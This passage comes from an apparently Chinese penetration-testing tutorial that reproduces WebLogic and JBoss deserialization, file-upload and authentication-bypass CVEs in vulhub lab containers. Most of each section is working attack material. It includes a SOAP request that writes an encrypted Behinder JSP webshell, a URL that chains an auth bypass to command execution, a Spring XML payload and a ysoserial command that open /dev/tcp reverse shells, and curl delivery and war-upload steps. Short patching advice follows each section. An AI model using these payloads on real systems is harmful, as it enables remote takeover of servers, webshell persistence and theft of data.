href="http://192.168.23.133:7001/bea_wls_internal/wlscmd.jsp?tom=aWQ=">http://192.168.23.133:7001/bea_wls_internal/wlscmd.jsp?tom=aWQ=</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/fc99ea880ac94e128db418474e184cf8.png)</span><br><span class="line">漏洞修复</span><br></pre></td></tr></table></figure><p>1.及时更新补丁 ；<br>2.禁用T3协议 ；<br>3.禁止T3端口对外开放，或者限制可访问T3端口的IP来源。<br>4.升级版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">## 5、CVE-2018-2894</span><br><span class="line">WebLogic文件任意上传漏洞</span><br><span class="line">漏洞描述</span><br></pre></td></tr></table></figure><p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在 “生产模式” 下默认<br>不开启，所以该漏洞有一定限制。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">影响版本</span><br></pre></td></tr></table></figure><p>weblogic 10.3.6.0<br>weblogic 12.1.3.0<br>weblogic 12.2.1.2<br>weblogic 12.2.1.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境搭建</span><br></pre></td></tr></table></figure><p>cd  vulhub-master&#x2F;weblogic&#x2F;CVE-2018-2894<br>docker-compose up -d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这里的后台密码是随机的，获取密码： docker-compose logs | grep password  </span><br><span class="line">![image-20220906160225434](https://img-blog.csdnimg.cn/img_convert/b2797f67783b0b015db0b1520256bf31.png)</span><br></pre></td></tr></table></figure><p>weblogic<br>xZNU746F</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">访问</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/console/login/LoginForm.jsp">http://192.168.23.133:7001/console/login/LoginForm.jsp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设置web服务测试开启</span><br><span class="line">![image-20220906160431504](https://img-blog.csdnimg.cn/img_convert/f3b42894f7048e8c89fefd0b1208ce91.png)</span><br><span class="line">![image-20220906160515767](https://img-blog.csdnimg.cn/img_convert/ee3c57ef2f4996c3168e6d661b9e24aa.png)</span><br><span class="line">**点击保存**  , 进入 config.do 文件进行设置，将目录设置为 ws_utc 应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要</span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/ws_utc/config.do">http://192.168.23.133:7001/ws_utc/config.do</a><br>&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/a4d3b6c5c2164883a45ccc4d0eb01c3c.png)</span><br><span class="line">漏洞复现</span><br><span class="line">点击安全 , 点击添加</span><br><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/b38d25126e99441dbdeaa03a676bfc48.png)</span><br><span class="line">右键审查元素 , 然后搜索16 , 找到对应时间戳![在这里插入图片描述](https://img-blog.csdnimg.cn/1f100a3297a043dabcceeb1711f1b717.png)</span><br><span class="line">冰蝎链接</span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/ws_utc/css/config/keystore/1662550222461_test.jsp">http://192.168.23.133:7001/ws_utc/css/config/keystore/1662550222461_test.jsp</a><br>rebeyond</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/51fe9c0e696345a198afcf575028ffbe.png)</span><br><span class="line">漏洞修复</span><br></pre></td></tr></table></figure><p>1.关闭web服务测试开启<br>2.升级版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">##6、CVE-2017-3506</span><br><span class="line">XMLDecoder反序列化漏洞</span><br><span class="line">漏洞描述</span><br></pre></td></tr></table></figure><p>CVE-2019-2725是一个Oracle weblogic反序列化远程命令执行漏洞，这个漏洞依旧是根据weblogic的 xmldecoder反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">影响范围</span><br></pre></td></tr></table></figure><p>weblogic 10.x<br>weblogic 12.1.3</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">环境搭建</span><br></pre></td></tr></table></figure><p>cd  vulhub-master&#x2F;weblogic&#x2F;weak_password<br>docker-compose up -d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">漏洞复现</span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/_async/AsyncResponseService">http://192.168.23.133:7001/_async/AsyncResponseService</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">若出现以下显示，则说明存在漏洞</span><br><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/9179b426349b4b2eaf8101774772a59f.png)</span><br><span class="line">当前页面抓包 , 修改请求包 , 写入shell</span><br><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/5aaaa5c011b5468c8ed4e9c2e6aa619a.png)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>POST &#x2F;_async&#x2F;AsyncResponseService HTTP&#x2F;1.1<br>Host: 192.168.23.133:7001<br>Content-Length: 1261<br>Accept-Encoding: gzip, deflate<br>SOAPAction:<br>Accept: <em>&#x2F;</em><br>User-Agent: Apache-HttpClient&#x2F;4.1.1 (java 1.5)<br>Connection: keep-alive<br>content-type: text&#x2F;xml</p><p>&lt;soapenv:Envelope xmlns:soapenv&#x3D;”<a href="http://schemas.xmlsoap.org/soap/envelope/&quot;">http://schemas.xmlsoap.org/soap/envelope/&quot;</a> xmlns:wsa&#x3D;”<a href="http://www.w3.org/2005/08/addressing&quot;">http://www.w3.org/2005/08/addressing&quot;</a> xmlns:asy&#x3D;”<a href="http://www.bea.com/async/AsyncResponseService&quot;&gt;">http://www.bea.com/async/AsyncResponseService&quot;&gt;</a><a href="soapenv:Header">soapenv:Header</a><a href="wsa:Action">wsa:Action</a>xx</wsa:Action><a href="wsa:RelatesTo">wsa:RelatesTo</a>xx</wsa:RelatesTo>&lt;work:WorkContext xmlns:work&#x3D;”<a href="http://bea.com/2004/06/soap/workarea/&quot;&gt;">http://bea.com/2004/06/soap/workarea/&quot;&gt;</a><java version="1.8.0_131" class="java.beans.xmlDecoder"><object class="java.io.PrintWriter"><string>servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls9_async_response&#x2F;8tpkys&#x2F;war&#x2F;webshell.jsp</string><void method="println"><string><![CDATA[<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>]]><br></string></void><void method="close"/></object></java></work:WorkContext></soapenv:Header><a href="soapenv:Body">soapenv:Body</a><a href="asy:onAsyncDelivery/">asy:onAsyncDelivery/</a></soapenv:Body></soapenv:Envelope></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用冰蝎链接</span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/_async/webshell.jsp">http://192.168.23.133:7001/_async/webshell.jsp</a><br>rebeyond</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/84430e19984042bd94efe0ca5dc378c3.png)</span><br><span class="line">漏洞修复</span><br></pre></td></tr></table></figure><p>1.禁用bea_wls9_async_response组件；<br>2.删除wls9_async_response的war包并重启 ；<br>3.禁止访问 &#x2F;_async&#x2F;* 路径。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">##7、CVE-2020-14882</span><br><span class="line">WebLogic远程代码执行漏洞  </span><br><span class="line">### （1）漏洞介绍</span><br><span class="line">CVE-2020-14882 允许远程用户绕过管理员控制台组件中的身份验证，CVE-2020-14883 允许经过身份验证的用户在管理员控制台组件上执行任何命令。使用这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机</span><br><span class="line">###（2）影响版本</span><br></pre></td></tr></table></figure><p>10.3.6.0<br>12.1.3.0<br>12.2.1.3<br>12.2.1.4<br>14.1.1.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">### （3）环境搭建</span><br></pre></td></tr></table></figure><p>cd vulhub-master&#x2F;weblogic&#x2F;CVE-2020-14882<br>docker-compose up -d</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">###（4）漏洞复现</span><br><span class="line"></span><br><span class="line">访问管理控制台</span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/console/login/LoginForm.jsp">http://192.168.23.133:7001/console/login/LoginForm.jsp</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用以下url绕过登录认证</span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/console/css/%252e%252e%252fconsole.portal">http://192.168.23.133:7001/console/css/%252e%252e%252fconsole.portal</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/c2be4761cde6473f9a6ee355fec8c375.png)</span><br><span class="line"></span><br><span class="line">此时，还没有上传 webshell 的权限</span><br><span class="line">![image-20220323215151218](https://img-blog.csdnimg.cn/img_convert/d6145944c384022e78b6affe299614e0.png)</span><br><span class="line">第二个漏洞，CVE-2020-14883，有两种利用方式，一种是通过</span><br><span class="line"></span><br><span class="line">`com.tangosol.coherence.mvel2.sh.ShellSession`，另一种是通过</span><br><span class="line"></span><br><span class="line">`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`。</span><br><span class="line"></span><br><span class="line">访问以下 URL 以链接 2 个漏洞并执行以下命令`com.tangosol.coherence.mvel2.sh.ShellSession`</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a href="http://192.168.23.133:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;">http://192.168.23.133:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;</a>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">我们进入到docker中可以看到命令已经成功运行了</span><br><span class="line"></span><br><span class="line">![在这里插入图片描述](https://img-blog.csdnimg.cn/71b9265c5431428eba1d8b384e09c571.png)</span><br><span class="line">这种利用方法只能在 Weblogic 12.2.1 及以上版本中使用，因为 10.3.6 没有 class</span><br></pre></td></tr></table></figure><p>com.tangosol.coherence.mvel2.sh.ShellSession</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext`是一种更常见的漏洞利用，首次在 CVE-2019-2725 中引入，可用于任何 Weblogic 版本。</span><br><span class="line">要利用`FileSystemXmlApplicationContext`，您需要制作一个精心制作的 XML 文件并将其提供到 Weblogic 可以</span><br><span class="line">访问的服务器上，例如`http://192.168.23.133:8000/rce.xml` , 因为我们的环境在docker中 , 使用物理机存在恶意的</span><br><span class="line">xml文件 , 是一定能够访问的</span><br><span class="line">```xml</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="line">&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;</span><br><span class="line">   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;</span><br><span class="line">    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;</span><br><span class="line">        &lt;constructor-arg&gt;</span><br><span class="line">          &lt;list&gt;</span><br><span class="line">            &lt;value&gt;bash&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;-c&lt;/value&gt;</span><br><span class="line">            &lt;value&gt;&lt;![CDATA[/bin/bash -i &gt;&amp; /dev/tcp/192.168.23.133/5656 0&gt;&amp;1]]&gt;&lt;/value&gt;</span><br><span class="line">          &lt;/list&gt;</span><br><span class="line">        &lt;/constructor-arg&gt;</span><br><span class="line">    &lt;/bean&gt;</span><br><span class="line">&lt;/beans&gt;</span><br></pre></td></tr></table></figure><p>然后通过以下 URL，Weblogic 将加载此 XML 并执行其中的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://192.168.23.133:8000/rce.xml&quot;)</span><br></pre></td></tr></table></figure><p>成功接收到反弹的shell<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a59dfd4f80b54998bfe4c5f75609b255.png" alt="在这里插入图片描述"><br>该漏洞利用的缺点是，<strong>它要求 Weblogic 服务器能够访问恶意 XML</strong>。<br>给你一个网站你怎么判断是否使用了weblogic</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 7001</span><br><span class="line">2. 浏览器插件</span><br><span class="line">3.报错页面  Error 404--Not Found</span><br><span class="line">4.默认管理页面路由  /console/login/LoginForm.jsp</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h1 id="四、Jboss"><a href="#四、Jboss" class="headerlink" title="四、Jboss"></a>四、Jboss</h1><h2 id="1、Jboss介绍"><a href="#1、Jboss介绍" class="headerlink" title="1、Jboss介绍"></a>1、Jboss介绍</h2><p><strong>JBoss是一个基于J2EE的开发源代码的应用服务器</strong>。JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。在J2EE应用服务器领域，JBoss是发展最为迅速的应用服务器。由于JBoss遵循商业友好的LGPL授权分发，并且由开源社区开发，这使得JBoss广为流行。  </p><h2 id="2、CVE-2015-7501"><a href="#2、CVE-2015-7501" class="headerlink" title="2、CVE-2015-7501"></a>2、CVE-2015-7501</h2><p>jBoss JMXInvokerServlet 反序列化漏洞<br>漏洞介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是经典的JBoss反序列化漏洞，JBoss在`/invoker/JMXInvokerServlet`请求中读取了用户传入的对象，然后我们利用Apache Commons Collections中的 Gadget 执行任意代码</span><br></pre></td></tr></table></figure><p>影响范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Red Hat JBoss A-MQ 6.x版本；</span><br><span class="line">BPM Suite (BPMS) 6.x版本；</span><br><span class="line">BRMS 6.x版本和5.x版本；</span><br><span class="line">Data Grid (JDG) 6.x版本；</span><br><span class="line">Data Virtualization (JDV) 6.x版本和5.x版本；</span><br><span class="line">Enterprise Application Platform 6.x版本，5.x版本和4.3.x版本；Fuse 6.x版本；Fuse Service Works (FSW) 6.x版本；Operations Network (JBoss ON) 3.x版本；Portal 6.x版本；SOA Platform (SOA-P) 5.x版本；Web Server (JWS) 3.x版本；Red Hat OpenShift/xPAAS 3.x版本；Red Hat Subscription Asset Manager 1.3版本。</span><br></pre></td></tr></table></figure><p>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/jboss/JMXInvokerServlet-deserialization</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问主页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/381a7b7a60bf454a9308f374733e8340.png" alt="在这里插入图片描述"><br>漏洞复现<br>poc , 访问地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/invoker/JMXInvokerServlet</span><br></pre></td></tr></table></figure><p>返回如下，说明接口开放，此接口存在反序列化漏洞<br><img src="http://120.48.107.243:9090/blog/2023/04/03/826beee3fbdb4b71a24775a884e016f6.png" alt="在这里插入图片描述"><br>下载 ysoserial 工具进行漏洞利用 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>kali执行下面命令（echo后面那一串，自行用base64解码后修改再编码）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">java8 -jar ysoserial-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjEzMy82NjY2IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; &quot; &gt;exp.ser</span><br><span class="line"></span><br><span class="line"># 更改反弹shell的base64编码内容</span><br></pre></td></tr></table></figure><p>设置监听的端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 6666</span><br></pre></td></tr></table></figure><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.23.133:8080/invoker/JMXInvokerServlet --data-binary @exp.ser</span><br></pre></td></tr></table></figure><p>成功收到反弹的shell<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c81730319c644394b6bc2592f87d6d0b.png" alt="在这里插入图片描述"><br>漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">升级版本</span><br></pre></td></tr></table></figure><h2 id="3、CVE-2017-7504"><a href="#3、CVE-2017-7504" class="headerlink" title="3、CVE-2017-7504"></a>3、CVE-2017-7504</h2><p>JBossMQ JMS 反序列化漏洞<br>漏洞介绍</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`JBoss AS 4.x`及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码执行</span><br></pre></td></tr></table></figure><p>影响范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">影响范围：JBoss 4.x 以及之前的所有版本</span><br></pre></td></tr></table></figure><p>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/jboss/CVE-2017-7504</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>漏洞复现<br>访问漏洞地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/jbossmq-httpil/HTTPServerILServlet</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e3d46d93fc834618ad7c6400db8e5a5a.png" alt="在这里插入图片描述"><br>出现该页面存在漏洞！</p><p>这里直接利用 JavaDeserH2HC 生成利用文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">javac8 -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java8 -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.23.133:8888     </span><br><span class="line"># 接收反弹的ip和port</span><br></pre></td></tr></table></figure><p>监听8888端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><p>利用<br>操作命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.23.133:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p>成功获得反弹shell！<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7668436ee6a14694b2b0d2f126e7708e.png" alt="在这里插入图片描述"><br>漏洞修复</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">升级至最新版</span><br></pre></td></tr></table></figure><h2 id="4、CVE-2017-12149"><a href="#4、CVE-2017-12149" class="headerlink" title="4、CVE-2017-12149"></a>4、CVE-2017-12149</h2><p>JBoss 5.x&#x2F;6.x 反序列化漏洞<br>漏洞描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞</span><br></pre></td></tr></table></figure><p>影响范围</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JBoss 5.x/6.x</span><br></pre></td></tr></table></figure><p>环境搭建</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/jboss/CVE-2017-12149</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>漏洞复现<br>访问漏洞页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bca5e83da6ca46de98cd0d3141a45801.png" alt="在这里插入图片描述"><br>验证是否存在漏洞 , 访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/invoker/readonly</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0178dd9ca6584832835ca8d667be8b0a.png" alt="在这里插入图片描述"><br>返回500，说明页面存在，此页面存在反序列化漏洞<br>使用之前CVE-2015-7501的ser文件 , 利用即可<br>监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><p>利用…Map.ser</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.23.133:8080/invoker/readonly --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure><p>成功接收到反弹的shell<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c328e1528e8a4bdaa9ec58be95a2a747.png" alt="在这里插入图片描述"></p><h2 id="5、Administration-Console-弱口令"><a href="#5、Administration-Console-弱口令" class="headerlink" title="5、Administration Console 弱口令"></a>5、Administration Console 弱口令</h2><p>漏洞描述</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administration Console管理页面存在弱口令，`admin:admin`，登陆后台上传war包 , getshell</span><br></pre></td></tr></table></figure><p>影响版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全版本</span><br></pre></td></tr></table></figure><p>环境搭建<br>因为这里用的环境是CVE-2017-12149的靶机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd vulhub-master/jboss/CVE-2017-12149</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>密码文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/jboss-6.1.0.Final/server/default/conf/props/jmx-console-users.properties</span><br><span class="line">admin:vulhub</span><br></pre></td></tr></table></figure><p>漏洞复现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/admin-console/login.seam?conversationId=4</span><br></pre></td></tr></table></figure><p><img src="http://120.48.107.243:9090/blog/2023/04/03/cfc3ea6a03264de6bc52e547c85b0e36.png" alt="在这里插入图片描述"><br>账号密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">vulhub</span><br></pre></td></tr></table></figure><p>点击web应用<br><img src="http://120.48.107.243:9090/blog/2023/04/03/641e01c8855346d9a08662e4e6ef6d6d.png" alt="在这里插入图片描述"><br>上传war木马 , 点击 Add a new resource，上传war包 , 使用我们之前制作的 shell.war , 然后点击继续<br><img src="http://120.48.107.243:9090/blog/2023/04/03/8a78d7b2c6a54c838bb4ee05b7866764.png" alt="在这里插入图片描述"><br>成功上传shell.war , 点击创建的war包进入下一层，若状态为stop，点击Start按钮（默认都是start状态，不需要点击Start按钮)<br>使用冰蝎链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.23.133:8080/shell/shell.jsp</span><br><span class="line">rebeyond</span><br></pre></td></tr></table></figure><p><img 